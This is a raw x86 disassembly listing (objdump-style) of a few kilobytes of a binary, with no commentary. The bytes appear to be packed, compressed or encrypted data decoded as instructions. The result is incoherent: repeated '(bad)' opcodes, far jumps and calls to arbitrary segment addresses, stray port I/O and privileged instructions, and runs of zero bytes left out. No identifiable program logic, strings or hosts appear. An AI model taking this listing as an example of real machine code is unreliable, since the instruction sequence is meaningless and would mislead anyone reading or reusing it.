  42d079:	(bad)  
  42d07a:	or     al,0x4
  42d07c:	dec    eax
  42d07d:	(bad)  
  42d07f:	push   edi
  42d080:	data16 jne 0x42d072
  42d083:	jmp    0x42d011
  42d085:	fwait
  42d086:	iret   
  42d087:	mov    dh,0x45
  42d089:	push   edx
  42d08a:	ds out 0x78,al
  42d08d:	mov    bh,0xf5
  42d08f:	arpl   WORD PTR [eax],si
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [edi-0x63],bl
  42d102:	push   ebp
  42d103:	inc    ecx
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x7b000001
  42d10d:	lds    ebx,FWORD PTR [esi+0x12]
  42d110:	xchg   ebx,eax
  42d111:	push   es
  42d112:	mov    dl,0x9b
  42d114:	mov    edi,DWORD PTR [esi]
  42d116:	mov    ebx,edx
  42d118:	mov    cl,BYTE PTR [eax]
  42d11a:	xchg   ecx,eax
  42d11b:	aam    0xd9
  42d11d:	int    0x39
  42d11f:	imul   ebp,DWORD PTR [ecx+0x48500655],0x49c7488d
  42d129:	aaa    
  42d12a:	or     edi,DWORD PTR [esi+esi*4-0x72]
  42d12e:	fiadd  DWORD PTR ds:[esi-0x44]
  42d132:	add    bl,BYTE PTR [esi+0x1acc7a13]
  42d138:	push   ecx
  42d139:	loope  0x42d10b
  42d13b:	pop    esp
  42d13c:	jo     0x42d197
  42d13e:	cmp    esp,esp
  42d140:	sahf   
  42d141:	loopne 0x42d15e
  42d143:	or     DWORD PTR [edx],0x1e
  42d146:	mov    DWORD PTR [edi+0x5c],ebp
  42d149:	outs   dx,DWORD PTR ds:[esi]
  42d14a:	das    
  42d14b:	pop    ecx
  42d14c:	push   ds
  42d14d:	ins    BYTE PTR es:[edi],dx
  42d14e:	jnp    0x42d181
  42d150:	gs jle 0x42d14d
  42d153:	pop    edi
  42d154:	mov    esi,0x8683094a
  42d159:	pop    ebx
  42d15a:	in     al,0xaa
  42d15c:	jnp    0x42d1cb
  42d15e:	shr    ecx,cl
  42d160:	ret    0x3571
  42d163:	cmc    
  42d164:	das    
  42d165:	mov    ebp,0xb1f9ce5b
  42d16a:	scas   eax,DWORD PTR es:[edi]
  42d16b:	sub    DWORD PTR [edx-0x5b058609],ebp
  42d171:	int3   
  42d172:	sub    al,0xc2
  42d174:	sbb    BYTE PTR [ecx+0x7a141356],ch
  42d17a:	xor    bl,dl
  42d17c:	stc    
  42d17d:	push   esp
  42d17e:	sbb    eax,0xecb8a499
  42d183:	ins    BYTE PTR es:[edi],dx
  42d184:	popf   
  42d185:	jmp    0x42d173
  42d187:	ins    BYTE PTR es:[edi],dx
  42d188:	dec    edi
  42d189:	jp     0x42d1e1
  42d18b:	lds    esi,FWORD PTR [ecx+0x22]
  42d18e:	inc    edi
  42d18f:	jnp    0x42d1ec
  42d191:	stc    
  42d192:	out    dx,eax
  42d193:	inc    esi
  42d194:	sub    eax,0xbd1dbd2b
  42d199:	popf   
  42d19a:	bound  ecx,QWORD PTR [ebp-0x6a]
  42d19d:	or     eax,0x58525251
  42d1a2:	pushf  
  42d1a3:	dec    ebp
  42d1a4:	xor    eax,ebx
  42d1a6:	scas   eax,DWORD PTR es:[edi]
  42d1a7:	test   eax,0xdb4927ac
  42d1ac:	leave  
  42d1ad:	pop    es
  42d1ae:	cmp    ebp,DWORD PTR [edi-0x107684d]
  42d1b4:	mov    ch,BYTE PTR [ecx]
  42d1b6:	fucomp st(2)
  42d1b8:	loope  0x42d177
  42d1ba:	(bad)  
  42d1bb:	fild   WORD PTR [ecx+0x73]
  42d1be:	push   ebp
  42d1bf:	pop    ds
  42d1c0:	fistp  DWORD PTR [ebp-0x2cdbc850]
  42d1c6:	out    0xa0,eax
  42d1c8:	rcl    DWORD PTR [esp+ebp*2+0x6c],0xc6
  42d1cd:	(bad)  
  42d1cf:	dec    esi
  42d1d0:	push   ss
  42d1d1:	mov    BYTE PTR [edi-0x398f0010],dl
  42d1d7:	xchg   BYTE PTR [esi-0x535dc882],bh
  42d1dd:	fcom   QWORD PTR [ebx]
  42d1df:	jmp    0x42d228
  42d1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1e2:	xor    DWORD PTR [edx+esi*1],eax
  42d1e5:	pusha  
  42d1e6:	jmp    0x42d238
  42d1e8:	dec    eax
  42d1e9:	mov    bh,0x95
  42d1eb:	xchg   esp,eax
  42d1ec:	call   0x3579:0xbdc19585
  42d1f3:	xor    dh,BYTE PTR [esi+ecx*2+0x43f154ef]
  42d1fa:	inc    edx
  42d1fb:	imul   esp,DWORD PTR [ebx],0x85847d7
  42d201:	and    ah,dh
  42d203:	add    eax,0x78cbef3
  42d208:	jmp    0xca14:0x3cf2a585
  42d20f:	adc    ebx,DWORD PTR [esi]
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2c4
  42d281:	ins    DWORD PTR es:[edi],dx
  42d282:	add    DWORD PTR ds:0x50001e4,ebx
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    BYTE PTR [esi-0x559cd0f9],cl
  42d291:	jmp    0x672a2570
  42d296:	inc    ebx
  42d297:	(bad)  
  42d298:	imul   BYTE PTR [edx-0x62ccaa28]
  42d29e:	xor    al,0x87
  42d2a0:	push   ebx
  42d2a1:	jae    0x42d22e
  42d2a3:	cs repz fs aad 0x44
  42d2a8:	mov    edi,0x11e912ab
  42d2ad:	mov    bh,0x47
  42d2af:	mov    ebx,0xf587bbd4
  42d2b4:	sbb    al,0xec
  42d2b6:	fwait
  42d2b7:	jmp    0xe7488514
  42d2bc:	inc    esi
  42d2bd:	cld    
  42d2be:	push   0x41
  42d2c0:	push   eax
  42d2c1:	inc    edi
  42d2c2:	mov    bh,0x2e
  42d2c4:	test   DWORD PTR [ebx],0x6e95b543
  42d2ca:	test   DWORD PTR [eax],esp
  42d2cc:	out    dx,eax
  42d2cd:	dec    edi
  42d2ce:	scas   al,BYTE PTR es:[edi]
  42d2cf:	cvtdq2ps xmm4,XMMWORD PTR [ebp+ecx*4-0x21]
  42d2d4:	pop    ds
  42d2d5:	cwde   
  42d2d6:	call   0x224881c7
  42d2db:	pop    eax
  42d2dc:	mov    esp,edi
  42d2de:	pop    edi
  42d2df:	neg    DWORD PTR [edi+0x21dfb847]
  42d2e5:	mov    edx,0x44a74809
  42d2ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2eb:	lahf   
  42d2ec:	inc    esp
  42d2ed:	pusha  
  42d2ee:	adc    bl,BYTE PTR [esi+0xe1de21a]
  42d2f4:	mov    al,0xcd
  42d2f6:	dec    eax
  42d2f7:	cwde   
  42d2f8:	js     0x42d337
  42d2fa:	xor    eax,0xaa02b1e3
  42d2ff:	mov    cl,dl
  42d301:	les    ecx,FWORD PTR [edx]
  42d303:	jmp    0x42d307
  42d305:	cmc    
  42d306:	jl     0x42d2ad
  42d308:	mov    ebp,0xdb18bdaf
  42d30d:	push   edx
  42d30e:	mov    BYTE PTR [eax],cl
  42d310:	loopne 0x42d2fc
  42d312:	push   eax
  42d313:	sub    eax,DWORD PTR [ebp-0x63f9448b]
  42d319:	retf   0x2d18
  42d31c:	ds jp  0x42d319
  42d31f:	loope  0x42d31b
  42d321:	ret    
  42d322:	mul    DWORD PTR [ebp+0x3aa94b6c]
  42d328:	fiadd  DWORD PTR [ecx-0x5a]
  42d32b:	repz jecxz 0x42d304
  42d32e:	mov    ?,edx
  42d330:	enter  0x9c7d,0x16
  42d334:	adc    dh,BYTE PTR ds:0x6e0dbed4
  42d33a:	dec    esi
  42d33b:	push   es
  42d33c:	lea    eax,[ebp-0x4b]
  42d33f:	or     dh,BYTE PTR [ebx+ebx*2-0x4d8b9e9f]
  42d346:	out    0xd0,al
  42d348:	inc    esp
  42d349:	scas   eax,DWORD PTR es:[edi]
  42d34a:	aaa    
  42d34b:	nop
  42d34c:	aad    0x2c
  42d34e:	push   edi
  42d34f:	jmp    0x908e:0x42f59aa6
  42d356:	push   esi
  42d357:	outs   dx,DWORD PTR ds:[esi]
  42d358:	xor    eax,0x8dbf2ef0
  42d35d:	call   0xb7660d1e
  42d362:	repz mov cl,0x54
  42d365:	cmp    eax,0xeb67fef0
  42d36a:	push   edi
  42d36b:	bound  ecx,QWORD PTR [ebx+ebx*1-0x407f6a72]
  42d372:	lock mov ds:0x21369c3f,eax
  42d378:	adc    ebp,ebx
  42d37a:	jmp    0xe7948861
  42d37f:	mov    BYTE PTR [ecx-0x3ae27644],bl
  42d385:	pop    ss
  42d386:	jno    0x42d34e
  42d388:	aaa    
  42d389:	out    0x4f,eax
  42d38b:	xchg   ebx,eax
  42d38c:	pop    ebx
  42d38d:	loopne 0x42d3f3
  42d38f:	cmp    BYTE PTR [ecx+0x0],ch
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	dec    eax
  42d401:	in     eax,0xb4
  42d403:	call   0x105:0x1e522
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	mov    edx,0x4dd9cb5c
  42d411:	xchg   edi,eax
  42d412:	out    dx,al
  42d413:	pop    esi
  42d414:	retf   0x435d
  42d417:	sub    DWORD PTR [eax+0x19b7d75e],edi
  42d41d:	dec    eax
  42d41e:	mov    al,0xdc
  42d420:	mov    edi,0xf35e9636
  42d425:	mov    ah,0xf7
  42d427:	mov    bl,0xac
  42d429:	int3   
  42d42a:	scas   eax,DWORD PTR es:[edi]
  42d42b:	ret    0x2998
  42d42e:	sar    BYTE PTR [eax+edi*8+0x6f],0xc7
  42d433:	pop    ecx
  42d434:	daa    
  42d435:	mov    eax,ds:0xf5f74e57
  42d43a:	aas    
  42d43b:	pop    ecx
  42d43c:	inc    esi
  42d43d:	sbb    al,0x2d
  42d43f:	iret   
  42d440:	or     BYTE PTR [esi-0x7f],bh
  42d443:	nop
  42d444:	mov    es,edi
  42d446:	pop    esi
  42d447:	popa   
  42d448:	jb     0x42d495
  42d44a:	addr16 test al,0x1f
  42d44d:	xchg   ebx,eax
  42d44e:	mov    ch,BYTE PTR [ecx-0x5a781296]
  42d454:	popf   
  42d455:	cdq    
  42d456:	es enter 0xea49,0x2a
  42d45b:	jno    0x42d4d2
  42d45d:	xchg   esi,eax
  42d45e:	xchg   ebx,eax
  42d45f:	mov    ah,cl
  42d461:	fisttp WORD PTR [ebx+ebx*8-0x65ed6f81]
  42d468:	fisubr DWORD PTR [ecx-0xf]
  42d46b:	and    BYTE PTR [esi],cl
  42d46d:	or     al,0x8f
  42d46f:	xor    BYTE PTR [ebx+ebp*1],ch
  42d472:	jae    0x42d4d8
  42d474:	mov    ds:0x2b79f952,eax
  42d479:	jmp    0x42d44c
  42d47b:	aad    0x39
  42d47d:	es xor al,0xe5
  42d480:	cmp    ebp,DWORD PTR [esi+0x55]
  42d483:	and    BYTE PTR [ecx+0x4f28b8de],bl
  42d489:	pop    edi
  42d48a:	mov    ebp,0x9f8d7ab6
  42d48f:	or     edx,DWORD PTR [ecx]
  42d491:	pusha  
  42d492:	xchg   ecx,eax
  42d493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d494:	jns    0x42d46c
  42d496:	jnp    0x42d4b8
  42d498:	(bad)  
  42d499:	mov    bl,0x37
  42d49b:	ret    
  42d49c:	in     eax,dx
  42d49d:	dec    edi
  42d49e:	mov    al,0x53
  42d4a0:	xchg   edi,eax
  42d4a1:	mov    al,BYTE PTR [ecx]
  42d4a3:	mov    BYTE PTR [ebx+ebx*1],bl
  42d4a6:	repz jmp 0x1d25:0xcc98f37b
  42d4ae:	mov    ds:0x2809beee,al
  42d4b3:	lods   eax,DWORD PTR ss:[esi]
  42d4b5:	mov    al,0x4f
  42d4b7:	in     al,0xed
  42d4b9:	mov    gs,WORD PTR [edx]
  42d4bb:	in     eax,dx
  42d4bc:	xchg   ebx,eax
  42d4bd:	(bad)  
  42d4be:	(bad)  
  42d4bf:	(bad)
  42d4c3:	mov    edx,0xd6f76c07
  42d4c8:	sti    
  42d4c9:	sbb    DWORD PTR [edi+0x45],edi
  42d4cc:	push   ecx
  42d4cd:	mov    eax,ds:0x7d66bd23
  42d4d2:	mov    ebp,0x6f5ff65f
  42d4d7:	add    BYTE PTR [ecx-0xe7e6d49],al
  42d4dd:	cmp    ah,BYTE PTR [edi]
  42d4df:	mov    ch,bl
  42d4e1:	mov    DWORD PTR [ebp+0x43],edx
  42d4e4:	pop    edi
  42d4e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4e6:	and    DWORD PTR [edx+0x11620396],esp
  42d4ec:	mov    ecx,0x16e70d66
  42d4f1:	js     0x42d4f0
  42d4f3:	mov    dl,0x4b
  42d4f5:	mov    dl,0x56
  42d4f7:	adc    al,0x14
  42d4f9:	and    eax,0xb91ce44d
  42d4fe:	xor    cl,BYTE PTR [eax-0x3cdd1709]
  42d504:	cmp    cl,cl
  42d506:	loope  0x42d540
  42d508:	or     ecx,DWORD PTR [esi-0x6eaa84fc]
  42d50e:	std    
  42d50f:	fst    DWORD PTR [esi+0x0]
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x844bfbd5,eax
  42d583:	push   ebx
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xee000001,al
  42d58d:	loop   0x42d574
  42d58f:	sub    WORD PTR [ecx+0x644ad871],ax
  42d596:	inc    edx
  42d597:	jecxz  0x42d552
  42d599:	jae    0x42d5cb
  42d59b:	jb     0x42d5a9
  42d59d:	dec    edi
  42d59e:	jb     0x42d61b
  42d5a0:	ds imul edi,edx,0x2508ff79
  42d5a7:	mov    edi,0xe53ebdb5
  42d5ac:	rol    ebp,1
  42d5ae:	lds    ebx,FWORD PTR [esi+0x79]
  42d5b1:	or     al,0x8c
  42d5b3:	rol    BYTE PTR es:[eax],0x35
  42d5b7:	and    al,cl
  42d5b9:	push   esp
  42d5ba:	cmp    eax,0x6d05b499
  42d5bf:	shufps xmm1,XMMWORD PTR [edx-0x5b],0x2c
  42d5c4:	cmp    DWORD PTR [ebx],ebx
  42d5c6:	call   0x538703ee
  42d5cb:	pushf  
  42d5cc:	pop    ds
  42d5cd:	inc    esp
  42d5ce:	mov    ds:0x32aec19,al
  42d5d3:	ins    DWORD PTR es:[edi],dx
  42d5d4:	enter  0x416,0x9d
  42d5d8:	mov    eax,0xe768151c
  42d5dd:	inc    esp
  42d5de:	inc    eax
  42d5df:	jns    0x42d654
  42d5e1:	push   esp
  42d5e2:	std    
  42d5e3:	ret    
  42d5e4:	xchg   esi,eax
  42d5e5:	dec    ebx
  42d5e6:	and    eax,0x5247abaa
  42d5eb:	int    0xf1
  42d5ed:	cli    
  42d5ee:	jb     0x42d647
  42d5f0:	sbb    al,0xee
  42d5f2:	shl    BYTE PTR [edx-0x67],cl
  42d5f5:	into   
  42d5f6:	data16 std 
  42d5f8:	rol    BYTE PTR [edx+0x42],0x85
  42d5fc:	daa    
  42d5fd:	arpl   WORD PTR [ebx+0x2a189ca6],dx
  42d603:	mov    edx,0x5ac8fafc
  42d608:	lahf   
  42d609:	xchg   esi,eax
  42d60a:	mov    WORD PTR [esi],ds
  42d60c:	jg     0x42d642
  42d60e:	out    0x46,eax
  42d610:	in     al,dx
  42d611:	and    DWORD PTR [edx+0x3d],ebx
  42d614:	(bad)  
  42d615:	aam    0xee
  42d617:	test   eax,0x16ddf34
  42d61c:	xor    edx,DWORD PTR [eax]
  42d61e:	fmul   QWORD PTR [edx+ebx*8+0x12]
  42d622:	jl     0x42d628
  42d624:	mov    bl,ch
  42d626:	test   BYTE PTR [ecx+0x1a],al
  42d629:	loopne 0x42d662
  42d62b:	push   cs
  42d62c:	popf   
  42d62d:	nop
  42d62e:	add    eax,0x15e6a58f
  42d633:	js     0x42d607
  42d635:	sti    
  42d636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d637:	jg     0x42d675
  42d639:	fwait
  42d63a:	push   ss
  42d63b:	stc    
  42d63c:	adc    eax,0x55c85036
  42d641:	inc    esi
  42d642:	sbb    edx,DWORD PTR [esi+eiz*8]
  42d645:	jno    0x42d69a
  42d647:	hlt    
  42d648:	jo     0x42d6b0
  42d64a:	outs   dx,DWORD PTR ds:[esi]
  42d64b:	push   eax
  42d64c:	jp     0x42d60f
  42d64e:	mov    edi,0xd1180ee7
  42d653:	sub    dl,BYTE PTR [ecx]
  42d655:	stos   DWORD PTR es:[edi],eax
  42d656:	leave  
  42d657:	and    esp,DWORD PTR [eax+0x51a03710]
  42d65d:	mov    gs,WORD PTR [ecx+0x56]
  42d660:	cmp    al,0x51
  42d662:	fs sar ebp,0xaa
  42d666:	or     BYTE PTR [edi-0x7f48faef],dh
  42d66c:	and    DWORD PTR gs:[ebx+0x70e80c84],0x3f
  42d674:	lods   al,BYTE PTR ds:[esi]
  42d675:	call   0x7202:0x8145ce2b
  42d67c:	ror    DWORD PTR [edi],1
  42d67e:	mov    ah,0x73
  42d680:	lahf   
  42d681:	loopne 0x42d6b4
  42d683:	and    DWORD PTR [ebx],edi
  42d685:	xchg   edi,eax
  42d686:	or     dh,dl
  42d688:	xlat   BYTE PTR ds:[ebx]
  42d689:	test   DWORD PTR [edi-0x3c],esi
  42d68c:	jne    0x42d644
  42d68e:	je     0x42d653
  42d690:	scas   eax,DWORD PTR es:[edi]
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xab
  42d701:	mov    WORD PTR [edi-0x68],es
  42d704:	sub    al,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x16000001
  42d70d:	jl     0x42d73e
  42d70f:	sub    al,0x6a
  42d711:	fidiv  DWORD PTR [ebp+0x77]
  42d714:	adc    BYTE PTR [ebp+0x1d],0xb2
  42d718:	sub    edi,0xf3c9e647
  42d71e:	aaa    
  42d71f:	aas    
  42d720:	int    0x8c
  42d722:	ins    BYTE PTR es:[edi],dx
  42d723:	mov    edi,0xc1fb7508
  42d728:	ret    0x88f0
  42d72b:	retf   
  42d72c:	jae    0x42d7a4
  42d72e:	(bad)  
  42d72f:	xchg   edx,eax
  42d730:	xor    eax,0xbc51518d
  42d735:	xor    BYTE PTR ds:0xe7ae40f4,dh
  42d73b:	and    ebx,DWORD PTR [ecx]
  42d73d:	(bad)  
  42d73f:	cmp    eax,0xcb8101f6
  42d744:	mov    eax,ds:0x1a524741
  42d749:	neg    BYTE PTR [ebx]
  42d74b:	das    
  42d74c:	push   0xffffffc6
  42d74e:	add    BYTE PTR [esi+ecx*4],al
  42d751:	fsub   st(3),st
  42d753:	cmc    
  42d754:	inc    ebp
  42d755:	in     al,dx
  42d756:	data16 lahf 
  42d758:	mov    ebp,0xc53a7bda
  42d75d:	push   eax
  42d75e:	aad    0x42
  42d760:	mov    esp,0xa0db6276
  42d765:	mov    es,WORD PTR ds:0xbb7c719c
  42d76b:	stos   BYTE PTR es:[edi],al
  42d76c:	(bad)  
  42d76d:	xlat   BYTE PTR ds:[ebx]
  42d76e:	fldcw  WORD PTR [esp+edx*2+0x34764bd6]
  42d775:	push   0xffffffe9
  42d777:	adc    al,0x41
  42d779:	push   ecx
  42d77a:	push   esp
  42d77b:	test   BYTE PTR [ecx+0x2b],ah
  42d77e:	fdiv   DWORD PTR [ebx]
  42d780:	aam    0x1c
  42d782:	ss js  0x42d713
  42d785:	sub    DWORD PTR [eax+eax*2-0x7040499b],0xc2f05f53
  42d790:	pop    es
  42d791:	cmp    eax,0xba54e919
  42d796:	inc    ecx
  42d797:	mov    WORD PTR [ebx+0x2d],gs
  42d79a:	pop    eax
  42d79b:	mov    ebp,0xde302571
  42d7a0:	sbb    al,0x11
  42d7a2:	jno    0x42d75d
  42d7a4:	sbb    DWORD PTR [edx+ebx*1],0xbdc291e0
  42d7ab:	pusha  
  42d7ac:	mov    cl,0xeb
  42d7ae:	sub    DWORD PTR [ebx-0x53aa8a88],ecx
  42d7b4:	push   edx
  42d7b5:	ins    BYTE PTR es:[edi],dx
  42d7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7b7:	pop    eax
  42d7b8:	sub    ch,BYTE PTR [edx+0x47542455]
  42d7be:	or     edi,ecx
  42d7c0:	xchg   esi,eax
  42d7c1:	iret   
  42d7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7c3:	call   0x8d1a:0x7336bfd9
  42d7ca:	shr    DWORD PTR [ebx+0x1],1
  42d7cd:	rcl    DWORD PTR [ebx+eax*8],cl
  42d7d0:	lahf   
  42d7d1:	push   edi
  42d7d2:	xchg   ebp,eax
  42d7d3:	xchg   edi,eax
  42d7d4:	repz push 0xffffffec
  42d7d7:	out    dx,al
  42d7d8:	mov    BYTE PTR [ecx],dl
  42d7da:	mov    ebp,0x16b0c845
  42d7df:	mul    ebx
  42d7e1:	(bad)  
  42d7e2:	pop    ds
  42d7e3:	sub    al,0xe6
  42d7e5:	or     BYTE PTR [edi+0x21c74909],0x38
  42d7ec:	jb     0x42d854
  42d7ee:	outs   dx,BYTE PTR ds:[esi]
  42d7ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7f0:	adc    eax,0x41417acc
  42d7f5:	popf   
  42d7f6:	dec    edx
  42d7f7:	ret    0xf7b2
  42d7fa:	jecxz  0x42d874
  42d7fc:	mov    eax,ds:0xd824761b
  42d801:	sub    al,0x71
  42d803:	jle    0x42d7ee
  42d805:	fcmovnu st,st(3)
  42d807:	gs mov esi,0x1f9b28eb
  42d80d:	je     0x42d838
  42d80f:	add    al,0xbe
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xfac6961a
  42d881:	sbb    DWORD PTR [ecx],0x13
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0x72000001
  42d88d:	mov    dh,0xeb
  42d88f:	mov    ebp,DWORD PTR [edi+0x63]
  42d892:	jmp    0x42d826
  42d894:	nop
  42d895:	out    0x6d,eax
  42d897:	and    DWORD PTR [ebp+0x3767c0e7],ebp
  42d89d:	mov    BYTE PTR [esi+0x75d8d782],0x7
  42d8a4:	xor    dh,ah
  42d8a6:	(bad)  
  42d8a7:	sbb    al,0xf2
  42d8a9:	cli    
  42d8aa:	aad    0xbf
  42d8ac:	stc    
  42d8ad:	jecxz  0x42d858
  42d8af:	test   eax,0x5e9e7941
  42d8b4:	jns    0x42d8f7
  42d8b6:	mov    esi,0x429ac1db
  42d8bb:	mov    ecx,0x912c26b7
  42d8c0:	lea    ebp,[ebx+eax*1-0xd520054]
  42d8c7:	cld    
  42d8c8:	pusha  
  42d8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8ca:	sub    BYTE PTR [ebx],cl
  42d8cc:	shl    DWORD PTR [eax],0x41
  42d8cf:	int3   
  42d8d0:	aad    0x52
  42d8d2:	(bad)  
  42d8d3:	arpl   WORD PTR [edx],bp
  42d8d5:	ficomp DWORD PTR [eax-0x44]
  42d8d8:	stos   DWORD PTR es:[edi],eax
  42d8d9:	test   BYTE PTR [esi],bh
  42d8db:	loope  0x42d899
  42d8dd:	push   esi
  42d8de:	outs   dx,DWORD PTR ds:[esi]
  42d8df:	out    0xb5,al
  42d8e1:	pop    edx
  42d8e2:	xchg   ebp,eax
  42d8e3:	or     ebp,edi
  42d8e5:	mov    eax,0x7453da5c
  42d8ea:	loope  0x42d900
  42d8ec:	jne    0x42d8e6
  42d8ee:	lods   al,BYTE PTR ds:[esi]
  42d8ef:	push   edi
  42d8f0:	call   0xbeb9:0x9784d4aa
  42d8f7:	test   dl,bh
  42d8f9:	js     0x42d8c1
  42d8fb:	(bad)  
  42d8fc:	mov    ebx,0xb9a4bd27
  42d901:	inc    edx
  42d902:	jmp    0xda3c:0xd404045c
  42d909:	sahf   
  42d90a:	mov    al,ds:0x9c7b20d7
  42d90f:	rcr    BYTE PTR [edx-0x29],1
  42d912:	jae    0x42d919
  42d914:	nop
  42d915:	bound  eax,QWORD PTR [edx-0x116d06b]
  42d91b:	test   eax,0x5741d874
  42d920:	adc    BYTE PTR [ebp+0x2ee00891],al
  42d926:	cmp    al,BYTE PTR [ebx-0x2c]
  42d929:	outs   dx,DWORD PTR ds:[esi]
  42d92a:	(bad)  
  42d92b:	mov    esi,0x49c8dabf
  42d930:	fadd   QWORD PTR [edx+ecx*1]
  42d933:	xor    esi,DWORD PTR [esi+0x580ab0d]
  42d939:	cmp    eax,0x26c8f8a3
  42d93e:	mov    edi,0xd4c11fee
  42d943:	jmp    0x8b5a:0x4055f96b
  42d94a:	(bad)  
  42d94b:	iret   
  42d94c:	mov    gs,WORD PTR [esi+0x0]
  42d94f:	sub    DWORD PTR [edi],0xffffff97
  42d952:	popa   
  42d953:	inc    ecx
  42d954:	fs test DWORD PTR cs:[ebp+ecx*8+0x409c0a4a],eax
  42d95d:	add    BYTE PTR [eax-0x13],dl
  42d960:	xchg   BYTE PTR [edx-0x6c],bl
  42d963:	mov    eax,ds:0x28b5e273
  42d968:	shr    DWORD PTR [edx-0x25],cl
  42d96b:	sbb    BYTE PTR [edi+ecx*4],dl
  42d96e:	test   eax,0x9dc14d0f
  42d973:	mov    edi,0x9d43f088
  42d978:	adc    eax,0xc9493972
  42d97d:	xlat   BYTE PTR ds:[ebx]
  42d97e:	aas    
  42d97f:	stc    
  42d980:	xchg   esi,eax
  42d981:	adc    eax,0x2bd8d868
  42d986:	adc    al,0x25
  42d988:	pop    ds
  42d989:	test   BYTE PTR [esi+0x21],ch
  42d98c:	or     ebx,ebx
  42d98e:	adc    BYTE PTR [ecx-0x36],al
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	lahf   
  42da01:	mov    al,0x49
  42da03:	fdiv   DWORD PTR [esi]
  42da05:	jmp    0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	or     DWORD PTR [esi-0x9],0x9c4c5c79
  42da13:	jmp    0xa72d3f03
  42da18:	mov    bh,0x7b
  42da1a:	lds    ebx,FWORD PTR [esi+edi*1-0x22f65b75]
  42da21:	dec    ecx
  42da22:	daa    
  42da23:	sub    BYTE PTR [ebx-0x5fc968d9],bh
  42da29:	fdiv   st(6),st
  42da2b:	sub    eax,0x830c2582
  42da30:	adc    ecx,DWORD PTR [edx+edi*1+0x39]
  42da34:	inc    ecx
  42da35:	xor    esp,ecx
  42da37:	outs   dx,DWORD PTR ds:[esi]
  42da38:	test   dl,ch
  42da3a:	push   ds
  42da3b:	call   0xaaf2b2f3
  42da40:	push   0xffffffb3
  42da42:	adc    ah,dh
  42da44:	enter  0x7d9e,0xb4
  42da48:	mov    dh,0x42
  42da4a:	(bad)  
  42da4b:	lds    esi,FWORD PTR [ebx-0x80]
  42da4e:	aaa    
  42da4f:	xchg   edx,eax
  42da50:	pop    es
  42da51:	enter  0xcf6e,0xe0
  42da55:	cld    
  42da56:	(bad)  
  42da57:	xchg   esp,eax
  42da58:	cmp    eax,0x852bab17
  42da5d:	and    eax,0xe297ef42
  42da62:	or     ch,BYTE PTR [ebx-0xe]
  42da65:	mov    bh,0x6b
  42da67:	js     0x42da86
  42da69:	xchg   ebp,eax
  42da6a:	sbb    al,BYTE PTR [esi+eax*8+0x2f320d19]
  42da71:	jne    0x42da2d
  42da73:	mov    ebp,0xa24859ea
  42da78:	stos   DWORD PTR es:[edi],eax
  42da79:	inc    esp
  42da7a:	dec    esp
  42da7b:	out    0x5a,al
  42da7d:	or     dl,BYTE PTR [eax-0x2f]
  42da80:	push   0xcfea9158
  42da85:	xchg   ebp,eax
  42da86:	lods   eax,DWORD PTR ds:[esi]
  42da87:	mov    dh,0xb2
  42da89:	std    
  42da8a:	cmp    DWORD PTR [eax+0x7378dd3d],esi
  42da90:	mov    dh,0xf3
  42da92:	adc    DWORD PTR [esi-0x2ec94375],ebx
  42da98:	sbb    DWORD PTR [ecx],edi
  42da9a:	int3   
  42da9b:	and    edi,DWORD PTR [edi-0xe59d0d2]
  42daa1:	sbb    al,0x97
  42daa3:	out    0x4d,al
  42daa5:	clc    
  42daa6:	ret    
  42daa7:	mov    al,0x12
  42daa9:	fwait
  42daaa:	push   0xecbbf7f7
  42daaf:	mov    bl,0xd3
  42dab1:	out    dx,al
